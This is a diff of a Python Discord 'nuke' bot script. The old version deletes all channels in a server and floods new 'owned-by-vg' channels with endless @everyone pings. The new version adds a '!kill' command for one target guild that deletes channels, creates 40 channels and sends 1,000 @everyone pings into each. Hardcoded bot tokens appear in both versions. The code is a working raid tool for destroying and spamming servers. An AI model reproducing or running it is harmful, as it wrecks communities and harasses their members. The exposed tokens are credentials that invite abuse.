@@ -1,45 +1,64 @@
 import discord
+
+from discord.ext import commands
 import asyncio
 
-intents = discord.Intents.all()  
-client = discord.Client(intents=intents)
+TOKEN = "MTE4Mjk2NjM1NjkwODQ2MjA5MA.GHnfRZ.NFhAPU9Iy06mHPXNovc-6nSreBGCUQSqE0I0AA"
+COMMAND_PREFIX = "!"
+TARGET_GUILD_ID = 1190925166008619039 # Replace with the specific guild ID
+
+intents = discord.Intents.all()
+client = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
 
 @client.event
 async def on_ready():
-    print("Bot is ready.")
+    print(f"Logged in as {client.user.name}")
 
 @client.event
 async def on_message(message):
-    if message.content.startswith('!nuke'):
-        
-        if message.guild.me.guild_permissions.manage_channels:
-            # Delete all channels in bulk
-            for channel in message.guild.channels:
-                await channel.delete()
+    await client.process_commands(message)
 
-            
-            channels_to_create = [f"owned-by-vg-{i}" for i in range(1, 30)]
+@client.command(name="kill")
+async def kill(ctx):
+    if ctx.guild.id != TARGET_GUILD_ID:
+        await ctx.send("This command can only be used in a specific guild.")
+        return
 
-            # Create channels at a rate of 4 channels per second
-            for i in range(0, len(channels_to_create), 6):
-                await asyncio.gather(*[message.guild.create_text_channel(name, topic="This channel is owned by vg") for name in channels_to_create[i:i + 4]])
-                await asyncio.sleep(0.01)# Introduce a delay for 4 channels per second
+    print("Deleting channels and creating new ones...")
 
-            # Ping all channels concurrently
-            async def ping_channels():
-                created_channels = [channel for channel in message.guild.channels if channel.name.startswith("owned-by-vg")]
-                ping_tasks = [ping_channel(channel) for channel in created_channels]
-                await asyncio.gather(*ping_tasks)
+    # Fetch the guild object explicitly
+    guild = await client.fetch_guild(TARGET_GUILD_ID)
 
-            await asyncio.gather(ping_channels())
-        else:
-            await message.channel.send("I don't have the necessary permissions to manage channels.")
+    # Delete channels based on category and name
+    for category in guild.categories:
+        if category.name == "owned by de":
+            channels_to_delete = [channel for channel in category.channels]
+            for channel in channels_to_delete:
+                try:
+                    await channel.delete()
+                    await asyncio.sleep(0.1)  # 0.1-second delay after each channel deletion
+                except discord.Forbidden:
+                    print(f"Failed to delete channel {channel.name} due to missing permissions.")
+                except discord.HTTPException as e:
+                    print(f"Failed to delete channel {channel.name}. Error: {e}")
 
-async def ping_channel(channel):
-    while True:
-        await channel.send("@everyone owned by vg lmao")  # Send a ping
-          # Reduced sleep interval for 5 pings per second
-        await channel.send("@here beamed by vg lmao")  # Send another ping
-        
+    # Creating new channels concurrently
+    async def create_channels():
+        new_channels = [await guild.create_text_channel(name="owned by de", reason="Hacker's command") for _ in range(40)]
+        return new_channels
 
-client.run('MTE4ODA0NzQzNDg5OTc4Nzc3Ng.GWquz-.oYKBdaJucg2NJqWSlSCRvtBU07xvPERXXT9FZ8')
+    # Sending 1,000 pings in each channel with a 0.1-second delay
+    async def send_pings(channel):
+        messages = ["@everyone owned by de" for _ in range(1000)]
+        await asyncio.gather(*[channel.send(message) for message in messages])
+        await asyncio.sleep(0.1)  # 0.1-second delay after sending pings
+
+    # Gather all new channels created
+    new_channels = await asyncio.gather(create_channels())
+
+    # Send pings in each new channel
+    await asyncio.gather(*[send_pings(channel) for channel in new_channels[0]])
+
+    print("Process completed!")
+
+client.run(TOKEN)
